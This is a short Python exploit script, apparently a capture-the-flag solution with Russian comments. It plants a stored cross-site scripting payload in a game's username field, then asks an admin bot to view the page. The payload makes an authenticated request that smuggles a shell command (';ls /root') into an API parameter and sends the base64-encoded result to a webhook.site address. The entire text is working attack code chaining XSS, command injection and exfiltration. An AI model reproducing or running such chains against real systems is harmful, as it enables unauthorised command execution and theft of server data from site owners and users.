import requests

malicious_username = (
    '<script>'
    'fetch("http://127.0.0.1:1337/api/cal?modifier=;ls /root", {credentials: "include"})'
    '.then(response => response.text())'
    '.then(text => {'
    '  var b64data = btoa(text);'
    '  var img = new Image();'
    '  img.src = "	https://webhook.site/f998a9cc-5d37-46c9-844b-6adcf2487512/?data=" + b64data;'
    '})'
    '.catch(error => {'
    '  var img = new Image();'
    '  img.src = "https://webhook.site/f998a9cc-5d37-46c9-844b-6adcf2487512/?error=" + encodeURIComponent(error);'
    '});'
    '</script>'
)

data = {
    "username": malicious_username,
    "high_score": 100
}

response = requests.post('http://chal.competitivecyber.club:13337/api/stats', json=data)

# Получение ID сгенерированной записи на сервере
stat_id = response.json().get('id')
print("Stat ID:", stat_id)

# Вызов бота администратора для посещения сгенерированной страницы
path = f'api/stats/{stat_id}'
admin_response = requests.post(
    'http://chal.competitivecyber.club:13336/visit',
    data={'path': path}
)

# Вывод ответа от бота администратора
print("Admin Response:", admin_response.text)